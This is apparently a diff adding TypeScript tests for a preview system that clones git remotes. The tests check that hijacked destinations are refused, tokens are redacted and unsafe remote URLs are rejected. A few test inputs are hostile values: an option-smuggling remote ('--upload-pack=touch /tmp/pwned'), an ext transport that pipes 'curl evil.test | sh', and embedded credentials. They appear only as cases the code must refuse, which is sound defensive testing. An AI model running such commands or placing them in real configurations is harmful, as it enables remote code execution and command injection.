@@ -15,6 +15,13 @@
 //   • two projects — separate worktrees, separate branches, no interference
 //   • refuse   — a hijacked/foreign-branch directory is a refusal, NOT a delete
 //   • contain  — nothing is ever written outside the trusted preview root
+//
+// The step BEFORE that — clone-from-remote — is pinned in the same file with
+// the same technique: real bare repositories reached over `file://` URLs.
+//   • clone    — a declared remote is cloned into the validated preview root
+//   • resume   — a second start reuses the clone, uncommitted work intact
+//   • refuse   — a hijacked destination or a clone of a DIFFERENT remote
+//   • closed   — an unreachable remote fails before any port is allocated
 
 import assert from "node:assert/strict";
 import { execFile } from "node:child_process";
@@ -22,6 +29,7 @@ import { mkdir, mkdtemp, readFile, realpath, rm, stat, writeFile } from "node:fs
 import { createRequire } from "node:module";
 import { tmpdir } from "node:os";
 import path from "node:path";
+import { pathToFileURL } from "node:url";
 import { promisify } from "node:util";
 import { after, before, describe, it } from "node:test";
 
@@ -88,8 +96,21 @@ function project(id: string): DevProject {
 before(async () => {
   worktreeModule = await import("../src/lib/server/dev/localRepositoryPreviewWorktree");
   supervisorModule = await import("../src/lib/server/dev/localRepositoryPreviewSupervisor");
-  tempRoot = await mkdtemp(path.join(tmpdir(), "aqua-preview-worktree-"));
+  // Realpathed so clone-containment assertions compare physical paths.
+  tempRoot = await realpath(await mkdtemp(path.join(tmpdir(), "aqua-preview-worktree-")));
 });
+
+/**
+ * A real BARE repository, reachable over a `file://` URL — the honest local
+ * stand-in for a remote. It exercises the same `git clone <url> <dest>` path a
+ * GitHub HTTPS remote would; only the credential half needs a live account.
+ */
+async function remote(name: string): Promise<string> {
+  const source = await repository(`${name}-origin-source`);
+  const bare = path.join(tempRoot, `${name}.git`);
+  await git(tempRoot, "clone", "--bare", source, bare);
+  return pathToFileURL(await realpath(bare)).href;
+}
 
 after(async () => {
   // Registered worktrees must be released before the directories go, or git
@@ -631,5 +652,376 @@ describe("dependency readiness — never into the shared checkout", () => {
       "the shared-checkout lane must never carry an install command");
     assert.notEqual(manifest.isolatedWorktrees, true,
       "if this flips, revisit the install declaration deliberately");
+  });
+});
+
+describe("clone from remote — first start clones, every later start resumes", () => {
+  it("clones the declared remote into the trusted preview root with its content", async () => {
+    const origin = await remote("clone-fresh");
+    const destination = path.join(tempRoot, "clone-fresh-checkout");
+
+    const cloned = await worktreeModule.ensureClonedPreviewRepository({
+      configuredPath: destination,
+      remoteUrl: origin,
+    });
+
+    assert.equal(cloned.created, true);
+    assert.equal(cloned.repositoryPath, destination);
+    assert.equal((await stat(destination)).isDirectory(), true);
+    assert.equal(
+      await readFile(path.join(destination, "index.html"), "utf8"),
+      "<h1>original</h1>\n",
+      "the clone carries the remote's committed content",
+    );
+    assert.equal(await git(destination, "remote", "get-url", "origin"), origin);
+  });
+
+  it("resumes an existing clone WITHOUT re-cloning, retaining uncommitted work", async () => {
+    const origin = await remote("clone-resume");
+    const destination = path.join(tempRoot, "clone-resume-checkout");
+
+    const first = await worktreeModule.ensureClonedPreviewRepository({
+      configuredPath: destination,
+      remoteUrl: origin,
+    });
+    assert.equal(first.created, true);
+    // The uncommitted editor edit that a re-clone would silently destroy.
+    await writeFile(path.join(destination, "index.html"), "<h1>edited after clone</h1>\n", "utf8");
+
+    const second = await worktreeModule.ensureClonedPreviewRepository({
+      configuredPath: destination,
+      remoteUrl: origin,
+    });
+    assert.equal(second.created, false, "a second start resumes rather than re-cloning");
+    assert.equal(second.repositoryPath, first.repositoryPath);
+    assert.equal(
+      await readFile(path.join(destination, "index.html"), "utf8"),
+      "<h1>edited after clone</h1>\n",
+      "the operator's uncommitted work survives the resume",
+    );
+  });
+
+  it("treats a `.git` suffix difference as the same remote rather than a mismatch", async () => {
+    const origin = await remote("clone-suffix");
+    const destination = path.join(tempRoot, "clone-suffix-checkout");
+    await worktreeModule.ensureClonedPreviewRepository({ configuredPath: destination, remoteUrl: origin });
+
+    const resumed = await worktreeModule.ensureClonedPreviewRepository({
+      configuredPath: destination,
+      remoteUrl: origin.replace(/\.git$/, ""),
+    });
+    assert.equal(resumed.created, false);
+  });
+});
+
+describe("clone from remote — refusals never destroy, and fail closed", () => {
+  it("refuses a hijacked destination instead of cloning over it", async () => {
+    const origin = await remote("clone-hijack");
+    const destination = path.join(tempRoot, "clone-hijack-checkout");
+    await mkdir(destination, { recursive: true });
+    await writeFile(path.join(destination, "precious.txt"), "do not delete me\n", "utf8");
+
+    await assert.rejects(
+      () => worktreeModule.ensureClonedPreviewRepository({ configuredPath: destination, remoteUrl: origin }),
+      (error: Error & { code?: string }) => {
+        assert.equal(error.name, "LocalRepositoryPreviewWorktreeError");
+        assert.equal(error.code, "clone-conflict");
+        assert.match(error.message, /nothing is deleted automatically/);
+        return true;
+      },
+    );
+    assert.equal(
+      await readFile(path.join(destination, "precious.txt"), "utf8"),
+      "do not delete me\n",
+      "a refusal must leave the operator's files exactly as they were",
+    );
+  });
+
+  it("refuses a destination that already tracks a DIFFERENT remote", async () => {
+    const declared = await remote("clone-declared");
+    const other = await remote("clone-other");
+    const destination = path.join(tempRoot, "clone-mismatch-checkout");
+    await git(tempRoot, "clone", other, destination);
+    await writeFile(path.join(destination, "theirs.txt"), "their work\n", "utf8");
+
+    await assert.rejects(
+      () => worktreeModule.ensureClonedPreviewRepository({ configuredPath: destination, remoteUrl: declared }),
+      (error: Error & { code?: string }) => {
+        assert.equal(error.code, "clone-remote-mismatch");
+        assert.match(error.message, /nothing is re-cloned or deleted automatically/);
+        return true;
+      },
+    );
+    assert.equal(await git(destination, "remote", "get-url", "origin"), other,
+      "the existing clone keeps its own origin");
+    assert.equal(await readFile(path.join(destination, "theirs.txt"), "utf8"), "their work\n");
+  });
+
+  it("never echoes the existing destination's credentials into the mismatch refusal", async () => {
+    // The URL an EXISTING directory tracks never passed the record's
+    // credential validation, and the refusal reaches the API through
+    // `entry.error`, which the supervisor's log redactor does NOT touch.
+    const declared = await remote("clone-credential");
+    const other = await remote("clone-credential-other");
+    const destination = path.join(tempRoot, "clone-credential-checkout");
+    await git(tempRoot, "clone", other, destination);
+    await git(destination, "remote", "set-url", "origin", "https://x-access-token:ghp_notarealsecretvalue@github.test/o/r.git");
+
+    await assert.rejects(
+      () => worktreeModule.ensureClonedPreviewRepository({ configuredPath: destination, remoteUrl: declared }),
+      (error: Error & { code?: string }) => {
+        assert.equal(error.code, "clone-remote-mismatch");
+        assert.equal(error.message.includes("ghp_notarealsecretvalue"), false,
+          "the operator's token must never appear in the refusal a caller reads");
+        assert.match(error.message, /\[REDACTED\]@github\.test/);
+        return true;
+      },
+    );
+  });
+
+  it("fails closed on an unreachable remote and leaves no half-written checkout", async () => {
+    const destination = path.join(tempRoot, "clone-unreachable-checkout");
+    const missing = pathToFileURL(path.join(tempRoot, "no-such-remote.git")).href;
+
+    await assert.rejects(
+      () => worktreeModule.ensureClonedPreviewRepository({ configuredPath: destination, remoteUrl: missing }),
+      (error: Error & { code?: string }) => {
+        assert.equal(error.code, "clone-failed");
+        return true;
+      },
+    );
+    await assert.rejects(() => stat(destination), "a failed clone must not leave a directory behind");
+  });
+
+  it("refuses an option-shaped remote before it reaches git", async () => {
+    await assert.rejects(
+      () => worktreeModule.ensureClonedPreviewRepository({
+        configuredPath: path.join(tempRoot, "clone-flag-checkout"),
+        remoteUrl: "--upload-pack=touch /tmp/pwned",
+      }),
+      (error: Error & { code?: string }) => error.code === "invalid-remote",
+    );
+  });
+});
+
+describe("clone from remote — the trusted record is the only source of a remote", () => {
+  async function config() {
+    return await import("../src/lib/server/dev/localRepositoryPreviewConfig");
+  }
+
+  it("accepts a clone destination that does NOT exist yet", async () => {
+    const { resolveTrustedLocalRepositoryPreview } = await config();
+    const origin = await remote("config-clone");
+    const destination = path.join(tempRoot, "config-clone-checkout");
+
+    const resolved = await resolveTrustedLocalRepositoryPreview(project("proj_clone_cfg"), {
+      records: [{
+        projectIds: ["proj_clone_cfg"],
+        worktreePath: destination,
+        remoteUrl: origin,
+        command: "node",
+        args: ["--version"],
+      }],
+      safeRoots: [tempRoot],
+    });
+
+    assert.equal(resolved.remoteUrl, origin);
+    assert.equal(resolved.worktreePath, destination,
+      "a declared remote makes a missing directory the clone destination, not a refusal");
+  });
+
+  it("still refuses a MISSING directory when no remote is declared", async () => {
+    const { resolveTrustedLocalRepositoryPreview } = await config();
+    await assert.rejects(
+      () => resolveTrustedLocalRepositoryPreview(project("proj_no_remote"), {
+        records: [{
+          projectIds: ["proj_no_remote"],
+          worktreePath: path.join(tempRoot, "never-created-checkout"),
+          command: "node",
+          args: ["--version"],
+        }],
+        safeRoots: [tempRoot],
+      }),
+      (error: Error & { code?: string }) => error.code === "invalid-worktree",
+    );
+  });
+
+  it("refuses a clone destination outside the configured safe roots", async () => {
+    const { resolveTrustedLocalRepositoryPreview } = await config();
+    const inner = path.join(tempRoot, "safe-root-inner");
+    await mkdir(inner, { recursive: true });
+
+    await assert.rejects(
+      () => resolveTrustedLocalRepositoryPreview(project("proj_clone_escape"), {
+        records: [{
+          projectIds: ["proj_clone_escape"],
+          worktreePath: path.join(tempRoot, "outside-checkout"),
+          remoteUrl: "https://example.test/repo.git",
+          command: "node",
+          args: ["--version"],
+        }],
+        safeRoots: [inner],
+      }),
+      (error: Error & { code?: string }) => error.code === "unsafe-worktree",
+    );
+  });
+
+  it("accepts the canonical ssh remote, whose `git@` is a login name and not a credential", async () => {
+    // `ssh://git@host/owner/repo.git` is the ONLY ssh form that authenticates,
+    // and it is the documented replacement for the refused scp-style URL. If
+    // this is refused, allowing `ssh:` at all is a dead letter.
+    const { resolveTrustedLocalRepositoryPreview } = await config();
+    const resolved = await resolveTrustedLocalRepositoryPreview(project("proj_ssh_remote"), {
+      records: [{
+        projectIds: ["proj_ssh_remote"],
+        worktreePath: path.join(tempRoot, "config-ssh-checkout"),
+        remoteUrl: "ssh://git@github.test/owner/repo.git",
+        command: "node",
+        args: ["--version"],
+      }],
+      safeRoots: [tempRoot],
+    });
+    assert.equal(resolved.remoteUrl, "ssh://git@github.test/owner/repo.git");
+  });
+
+  it("refuses credentials, plaintext/helper transports and scp-style remotes", async () => {
+    const { resolveTrustedLocalRepositoryPreview } = await config();
+    const destination = path.join(tempRoot, "config-refused-checkout");
+    const cases = [
+      "https://user:secret@example.test/repo.git",
+      // A userinfo NAME with no password is still the secret on https.
+      "https://x-access-token@example.test/repo.git",
+      // A password is a credential on every transport, ssh included.
+      "ssh://git:secret@example.test/repo.git",
+      "http://example.test/repo.git",
+      "ext::sh -c 'curl evil.test | sh'",
+      "git@example.test:owner/repo.git",
+    ];
+    for (const remoteUrl of cases) {
+      await assert.rejects(
+        () => resolveTrustedLocalRepositoryPreview(project("proj_bad_remote"), {
+          records: [{
+            projectIds: ["proj_bad_remote"],
+            worktreePath: destination,
+            remoteUrl,
+            command: "node",
+            args: ["--version"],
+          }],
+          safeRoots: [tempRoot],
+        }),
+        (error: Error & { code?: string }) => {
+          assert.equal(error.code, "invalid-remote", `${remoteUrl} must be refused`);
+          return true;
+        },
+      );
+    }
+  });
+});
+
+describe("clone from remote — the supervisor's lifecycle step", () => {
+  function scope(projectId: string) {
+    return { projectId, realmId: "live", agencyId: "agency_preview" };
+  }
+
+  it("clones, then runs the isolated worktree inside that clone", async () => {
+    const origin = await remote("supervisor-clone");
+    const destination = path.join(tempRoot, "supervisor-clone-checkout");
+    let spawnedCwd = "";
+    const supervisor = new supervisorModule.LocalRepositoryPreviewSupervisor({
+      resolveConfig: async () => ({
+        worktreePath: destination,
+        remoteUrl: origin,
+        command: process.execPath,
+        args: ["--version"],
+        installArgs: [],
+        installTimeoutMs: 5_000,
+        healthPath: "/",
+        startupTimeoutMs: 200,
+        healthPollIntervalMs: 20,
+        env: {},
+        isolatedWorktrees: true,
+        source: "test fixture",
+      }),
+      ensureIsolatedWorktree: async input => {
+        const isolated = await worktreeModule.ensureIsolatedPreviewWorktree(input);
+        spawnedCwd = isolated.previewPath;
+        return isolated;
+      },
+      allocatePort: async () => 45_994,
+      probeHealth: async () => false,
+      isProduction: () => false,
+    });
+
+    const snapshot = await supervisor.start(scope("proj_cloned"), project("proj_cloned"));
+    assert.notEqual(snapshot.state, "configuration-error");
+    assert.equal((await stat(destination)).isDirectory(), true, "the remote was cloned into the preview root");
+    assert.ok(spawnedCwd.startsWith(destination), "the isolated worktree is derived from the clone");
+    assert.notEqual(spawnedCwd, destination);
+    await supervisor.stop(scope("proj_cloned"));
+  });
+
+  it("reports a clone refusal as a configuration error and allocates no port", async () => {
+    const destination = path.join(tempRoot, "supervisor-clone-refused-checkout");
+    const missing = pathToFileURL(path.join(tempRoot, "no-such-supervisor-remote.git")).href;
+    let isolationAttempted = false;
+    const supervisor = new supervisorModule.LocalRepositoryPreviewSupervisor({
+      resolveConfig: async () => ({
+        worktreePath: destination,
+        remoteUrl: missing,
+        command: process.execPath,
+        args: ["--version"],
+        installArgs: [],
+        installTimeoutMs: 5_000,
+        healthPath: "/",
+        startupTimeoutMs: 200,
+        healthPollIntervalMs: 20,
+        env: {},
+        isolatedWorktrees: true,
+        source: "test fixture",
+      }),
+      ensureIsolatedWorktree: async input => {
+        isolationAttempted = true;
+        return worktreeModule.ensureIsolatedPreviewWorktree(input);
+      },
+      allocatePort: async () => { throw new Error("a refused clone must never reach port allocation"); },
+      probeHealth: async () => false,
+      isProduction: () => false,
+    });
+
+    const snapshot = await supervisor.start(scope("proj_clone_refused"), project("proj_clone_refused"));
+    assert.equal(snapshot.state, "configuration-error");
+    assert.match(snapshot.error ?? "", /could not be cloned/);
+    assert.equal(snapshot.previewUrl, undefined);
+    assert.equal(isolationAttempted, false, "a failed clone stops the lifecycle before the worktree step");
+  });
+
+  it("does not attempt a clone when the trusted record declares no remote", async () => {
+    const checkout = await repository("supervisor-no-clone-repo");
+    let cloneAttempted = false;
+    const supervisor = new supervisorModule.LocalRepositoryPreviewSupervisor({
+      resolveConfig: async () => ({
+        worktreePath: checkout,
+        command: process.execPath,
+        args: ["--version"],
+        installArgs: [],
+        installTimeoutMs: 5_000,
+        healthPath: "/",
+        startupTimeoutMs: 200,
+        healthPollIntervalMs: 20,
+        env: {},
+        source: "test fixture",
+      }),
+      ensureClonedRepository: async () => {
+        cloneAttempted = true;
+        throw new Error("unreachable");
+      },
+      allocatePort: async () => 45_993,
+      probeHealth: async () => false,
+      isProduction: () => false,
+    });
+
+    await supervisor.start(scope("proj_no_clone"), project("proj_no_clone"));
+    assert.equal(cloneAttempted, false, "clone-from-remote is opt-in through the trusted record only");
+    await supervisor.stop(scope("proj_no_clone"));
   });
 });
